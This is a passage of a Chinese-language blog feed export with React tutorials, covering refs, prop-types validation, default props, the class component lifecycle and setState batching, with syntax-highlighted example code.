&#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">          &#123;<span class="comment">/* 没有被state控制的表单原生认为是非受控组件 */</span>&#125;</span><br><span class="line">          &lt;input ref=&#123;<span class="keyword">this</span>.mobileRef&#125; type=<span class="string">"text"</span> placeholder=<span class="string">"请输入手机号"</span> /&gt;</span><br><span class="line">          &lt;button onClick=&#123;<span class="keyword">this</span>.getMobile&#125;&gt;获取&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/</span>div&gt;</span><br><span class="line">      &lt;<span class="regexp">/&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">export default App;</span></span><br></pre></td></tr></table></figure><p><strong>总结：</strong></p><ul><li><code>ref</code> 的作用：获取DOM或组件</li><li>借助于<code>ref</code>，使用原生 DOM方式来获取表单元素值。</li></ul><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>1．组件的两种创建方式:函数组件和类组件 </p><p>2．无状态(函数)组件，负责静态结构展示 </p><p>3．有状态(类）组件，负责更新UI，让页面动起来 </p><p>4．绑定事件注意this指向问题 </p><p>5．推荐使用受控组件来处理表单 </p><p>6．完全利用JS语言的能力创建组件，这是 React的思想</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;React-组件介绍&quot;&gt;&lt;a href=&quot;#React-组件介绍&quot; class=&quot;headerlink&quot; title=&quot;React 组件介绍&quot;&gt;&lt;/a&gt;React 组件介绍&lt;/h2&gt;&lt;p&gt;组件允许你将 UI 拆分为&lt;strong&gt;独立可复用&lt;/strong&gt;的代码
      
    
    </summary>
    
      <category term="前端" scheme="//www.shen.ee/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="React" scheme="//www.shen.ee/tags/React/"/>
    
      <category term="React组件" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6/"/>
    
      <category term="React组件基础" scheme="//www.shen.ee/tags/React%E7%BB%84%E4%BB%B6%E5%9F%BA%E7%A1%80/"/>
    
      <category term="React定义组件" scheme="//www.shen.ee/tags/React%E5%AE%9A%E4%B9%89%E7%BB%84%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>React组件进阶及生命周期</title>
    <link href="//www.shen.ee/article/15749.html"/>
    <id>//www.shen.ee/article/15749.html</id>
    <published>2022-06-15T02:38:39.000Z</published>
    <updated>2022-06-22T06:24:25.999Z</updated>
    
    <content type="html"><![CDATA[<h2 id="props-类型校验"><a href="#props-类型校验" class="headerlink" title="props - 类型校验"></a>props - 类型校验</h2><ul><li>理解props都是外来的，在使用的时候如果数据类型不对，很容易造成组件内部逻辑出错</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开发者A创建的组件</span></span><br><span class="line"><span class="keyword">const</span> List = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> arr = props.colors</span><br><span class="line">  <span class="keyword">const</span> list = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &lt;li key=&#123;index&#125;&gt;&#123;item.name&#125;&lt;<span class="regexp">/li&gt;)</span></span><br><span class="line"><span class="regexp">return (</span></span><br><span class="line"><span class="regexp">&lt;ul&gt;&#123;list&#125;&lt;/u</span>l&gt;</span><br><span class="line">)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 开发者B去使用组件</span></span><br><span class="line">&lt;List colors=&#123;<span class="number">19</span>&#125; /&gt;</span><br></pre></td></tr></table></figure><p>报错：<code>TypeError: arr.map is not a function</code></p><ul><li><p>通过 prop-types 可以在创建组件的时候进行类型检查，更合理的使用组件避免错误</p><ul><li><p>安装 <code>yarn add prop-types</code></p></li><li><p>导入 <code>import PropTypes from &#39;prop-types&#39;</code></p></li><li><p>使用 <code>组件名.propTypes = { &#39;props属性&#39;:&#39;props校验规则&#39; }</code> 进行类型约定，<code>PropTypes</code> 包含各种规则</p></li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">'prop-types'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> List = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> arr = props.colors</span><br><span class="line">  <span class="keyword">const</span> lis = arr.map(<span class="function">(<span class="params">item, index</span>) =&gt;</span> &lt;li key=&#123;index&#125;&gt;&#123;item.name&#125;&lt;<span class="regexp">/li&gt;)</span></span><br><span class="line"><span class="regexp">  return &lt;ul&gt;&#123;lis&#125;&lt;/u</span>l&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">List.propTypes = &#123;</span><br><span class="line">  <span class="comment">// props属性：校验规则</span></span><br><span class="line">  colors: PropTypes.array</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Props-类型校验常见类型"><a href="#Props-类型校验常见类型" class="headerlink" title="Props - 类型校验常见类型"></a>Props - 类型校验常见类型</h2><h3 id="常见的校验规则"><a href="#常见的校验规则" class="headerlink" title="常见的校验规则"></a>常见的校验规则</h3><ol><li>常见类型：array、bool、func、number、object、string</li><li>React元素类型：element</li><li>必填项：isRequired</li><li>特定结构的对象：shape({})</li></ol><h3 id="校验规则的使用"><a href="#校验规则的使用" class="headerlink" title="校验规则的使用"></a>校验规则的使用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Demo = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Demo组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line">Demo.propTypes = &#123;</span><br><span class="line">  <span class="comment">// 常见类型</span></span><br><span class="line">  optionalFunc: PropTypes.func,</span><br><span class="line">  <span class="comment">// 常见类型+必填</span></span><br><span class="line">  requiredFunc: PropTypes.func.isRequired,</span><br><span class="line">  <span class="comment">// 特定结构的对象</span></span><br><span class="line">  optionalObjectWithShape: PropTypes.shape(&#123;</span><br><span class="line">    color: PropTypes.string,</span><br><span class="line">    fontSize: PropTypes.number</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="props-默认值"><a href="#props-默认值" class="headerlink" title="props - 默认值"></a>props - 默认值</h2><blockquote><p>作用：给组件的props设置默认值，在未传入props的时候生效</p></blockquote><h3 id="设置props的默认值"><a href="#设置props的默认值" class="headerlink" title="设置props的默认值"></a>设置props的默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分页组件</span></span><br><span class="line"><span class="keyword">const</span> Pagination = <span class="function">(<span class="params">props</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> pageSize的默认值：&#123;props.pageSize&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置默认值</span></span><br><span class="line">Pagination.defaultProps = &#123;</span><br><span class="line">pageSize: <span class="number">10</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用组件</span></span><br><span class="line">&lt;Pagination /&gt;</span><br></pre></td></tr></table></figure><h3 id="新版react推荐使用参数默认值来实现"><a href="#新版react推荐使用参数默认值来实现" class="headerlink" title="新版react推荐使用参数默认值来实现"></a>新版react推荐使用参数默认值来实现</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 分页组件</span></span><br><span class="line"><span class="keyword">const</span> Pagination = <span class="function">(<span class="params">&#123;pageSize = <span class="number">10</span>&#125;</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span> pageSize的默认值：&#123;pageSize&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用组件</span></span><br><span class="line">&lt;Pagination /&gt;</span><br></pre></td></tr></table></figure><h2 id="props-静态属性写法"><a href="#props-静态属性写法" class="headerlink" title="props - 静态属性写法"></a>props - 静态属性写法</h2><h3 id="类的静态属性"><a href="#类的静态属性" class="headerlink" title="类的静态属性"></a>类的静态属性</h3><ul><li>实例属性需要实例化后，通过实例访问</li><li>静态属性，可以通过类直接访问</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 实例属性</span></span><br><span class="line">  gender = <span class="string">'男'</span></span><br><span class="line">  <span class="comment">// 静态属性</span></span><br><span class="line">  <span class="keyword">static</span> age = <span class="number">18</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 访问静态属性</span></span><br><span class="line"><span class="built_in">console</span>.log(Person.age) <span class="comment">// 18</span></span><br><span class="line"><span class="comment">// 访问实例属性</span></span><br><span class="line"><span class="keyword">const</span> p = <span class="keyword">new</span> Person()</span><br><span class="line"><span class="built_in">console</span>.log(p.gender)   <span class="comment">// 男</span></span><br></pre></td></tr></table></figure><h3 id="类组件中-propTypes-defaultProps-的使用"><a href="#类组件中-propTypes-defaultProps-的使用" class="headerlink" title="类组件中 propTypes defaultProps 的使用"></a>类组件中 propTypes defaultProps 的使用</h3><ul><li>在类组件中通过 <code>static propTypes = {}</code> 定义props校验规则 <code>static defaultProps = {}</code> 定义props默认值</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 校验</span></span><br><span class="line">  <span class="keyword">static</span> propTypes = &#123;</span><br><span class="line">    colors: PropTypes.array,</span><br><span class="line">    gender: PropTypes.oneOf([<span class="string">'男'</span>, <span class="string">'女'</span>]).isRequired</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 默认值</span></span><br><span class="line">  <span class="keyword">static</span> defaultProps = &#123;</span><br><span class="line">gender: <span class="string">'男'</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Demo组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期-概览"><a href="#生命周期-概览" class="headerlink" title="生命周期 - 概览"></a>生命周期 - 概览</h2><h3 id="什么是组件生命周期"><a href="#什么是组件生命周期" class="headerlink" title="什么是组件生命周期"></a>什么是组件生命周期</h3><ul><li>一个事物从创建到最后消亡经历的整个过程</li></ul><p><img src="https://oss.iyouhun.com/img/md/02.6149b007.png" alt="人一生缩影"></p><h3 id="React类组件的生命周期整体概览，组件从创建到消耗的过程"><a href="#React类组件的生命周期整体概览，组件从创建到消耗的过程" class="headerlink" title="React类组件的生命周期整体概览，组件从创建到消耗的过程"></a>React类组件的生命周期整体概览，组件从创建到消耗的过程</h3><p><a href="http://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/" target="_blank" rel="noopener">React组件生命周期</a></p><p><img src="https://oss.iyouhun.com/img/md/image-20220608143938263.png" alt="image-20220608143938263"></p><h3 id="生命周期的意义"><a href="#生命周期的意义" class="headerlink" title="生命周期的意义"></a>生命周期的意义</h3><ul><li>助于理解组件的运行方式、完成更复杂的组件功能、分析组件错误原因</li><li>钩子函数为开发人员在不同阶段操作组件提供了时机</li></ul><p><strong>总结：</strong>只有类组件才有生命周期，分为 <code>挂载阶段</code> <code>更新阶段</code> <code>卸载阶段</code></p><h2 id="生命周期-挂载阶段"><a href="#生命周期-挂载阶段" class="headerlink" title="生命周期 - 挂载阶段"></a>生命周期 - 挂载阶段</h2><h3 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>constructor() –&gt; render() –&gt; componentDidMount() </p><h3 id="触发时机及作用"><a href="#触发时机及作用" class="headerlink" title="触发时机及作用"></a>触发时机及作用</h3><table><thead><tr><th>钩子函数</th><th>触发时机</th><th>作用</th></tr></thead><tbody><tr><td>constructor</td><td>创建组件时，最先执行</td><td>1. 初始化state 2. 创建 Ref 3. 使用 bind 解决 this 指向问题等</td></tr><tr><td>render</td><td>每次组件渲染都会触发</td><td>渲染UI（<strong>注意： 不能调用setState()</strong> ）</td></tr><tr><td>componentDidMount</td><td>组件挂载（完成DOM渲染）后</td><td>1. 发送网络请求 2.DOM操作</td></tr></tbody></table><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> () &#123;</span><br><span class="line">    <span class="keyword">super</span>()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'1. constructor执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  componentDidMount () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'3. componentDidMount执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2. render执行'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>App组件<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期-更新阶段"><a href="#生命周期-更新阶段" class="headerlink" title="生命周期 - 更新阶段"></a>生命周期 - 更新阶段</h2><h3 id="执行顺序-1"><a href="#执行顺序-1" class="headerlink" title="执行顺序"></a>执行顺序</h3><p>render() –&gt; componentDidUpdate()</p><h3 id="何时触发更新阶段"><a href="#何时触发更新阶段" class="headerlink" title="何时触发更新阶段"></a>何时触发更新阶段</h3><ol><li>setState()</li><li>forceUpdate() 强制组件更新</li><li>组件接收到新的props（实际上，只需要父组件更新，子组件就会重新渲染）</li></ol><h3 id="触发时机及作用-1"><a href="#触发时机及作用-1" class="headerlink" title="触发时机及作用"></a>触发时机及作用</h3><table><thead><tr><th>钩子函数</th><th>触发时机</th><th>作用</th></tr></thead><tbody><tr><td>render</td><td>每次组件渲染都会触发</td><td>渲染UI（与 挂载阶段 是同一个render）</td></tr><tr><td>componentDidUpdate</td><td>组件更新（完成DOM渲染）后</td><td>DOM操作，可以获取到更新后的DOM内容，<strong>不要直接调用setState</strong></td></tr></tbody></table><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>统计豆豆被打的次数：<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  componentDidUpdate() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'2. componentDidUpdate执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'1. render执行'</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;Child /&gt;</span><br><span class="line">        &lt;button onClick=&#123;<span class="keyword">this</span>.handleClick&#125;&gt;打豆豆&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="生命周期-卸载阶段"><a href="#生命周期-卸载阶段" class="headerlink" title="生命周期 - 卸载阶段"></a>生命周期 - 卸载阶段</h2><h3 id="什么时候触发卸载？"><a href="#什么时候触发卸载？" class="headerlink" title="什么时候触发卸载？"></a>什么时候触发卸载？</h3><ul><li>在组件被移除的时候（消失）触发卸载阶段</li></ul><h3 id="触发时机及作用-2"><a href="#触发时机及作用-2" class="headerlink" title="触发时机及作用"></a>触发时机及作用</h3><table><thead><tr><th>钩子函数</th><th>触发时机</th><th>作用</th></tr></thead><tbody><tr><td>componentWillUnmount</td><td>组件卸载（从页面中消失）</td><td>执行清理工作（比如：清理定时器等）</td></tr></tbody></table><p>例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  componentWillUnmount () &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'componentWillUnmount执行'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>统计豆豆被打的次数：&#123;this.props.count&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">App</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      count: <span class="keyword">this</span>.state.count + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &#123; <span class="keyword">this</span>.state.count &lt; <span class="number">5</span> &amp;&amp; <span class="xml"><span class="tag">&lt;<span class="name">Child</span> <span class="attr">count</span>=<span class="string">&#123;this.state.count&#125;</span> /&gt;</span>&#125;</span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span>&gt;</span>打豆豆<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="setState扩展-发现问题"><a href="#setState扩展-发现问题" class="headerlink" title="setState扩展 - 发现问题"></a>setState扩展 - 发现问题</h2><blockquote><p>发现setState是“异步”的，多次setState会合并。</p></blockquote><ul><li>理解setState是“异步”的，理解setState会合并更新<ul><li>调用 setState 时，将要更新的状态对象，放到一个更新队列中暂存起来（没有立即更新）</li><li>如果多次调用 setState 更新状态，<strong>状态会进行合并，后面覆盖前面</strong></li><li>等到所有的操作都执行完毕，React 会拿到最终的状态，然后触发组件更新</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">100</span>&#125;)</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;<span class="attr">count</span>: <span class="keyword">this</span>.state.count+<span class="number">1</span>&#125;)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.state.count)  <span class="comment">// 打印0</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'render'</span>)</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;Demo组件：&#123;<span class="keyword">this</span>.state.count&#125;&lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">        &lt;button onClick=&#123;this.handleClick&#125;&gt;体现“异步”和合并&lt;/</span>button&gt; </span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    )</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><ul><li>React这么处理的好处是什么？<ul><li>“异步” 更新，或者做延时更新，为了等所有操作结束后去更新</li><li>合并更新，是将多次setState合并，然后进行更新</li><li>都是为了提高渲染性能</li></ul></li></ul><h2 id="setState扩展-更多用法"><a href="#setState扩展-更多用法" class="headerlink" title="setState扩展 - 更多用法"></a>setState扩展 - 更多用法</h2><ul><li>多次使用setState让数据串联使用的写法</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123;Component&#125; <span class="keyword">from</span> <span class="string">'react'</span> </span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  state = &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// this.setState(&#123;count: this.state.count+1&#125;)</span></span><br><span class="line">    <span class="comment">// 页面展示 1</span></span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>.setState(<span class="function"><span class="params">prevState</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        count: prevState.count + <span class="number">1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// 页面展示 3</span></span><br><span class="line">  &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span 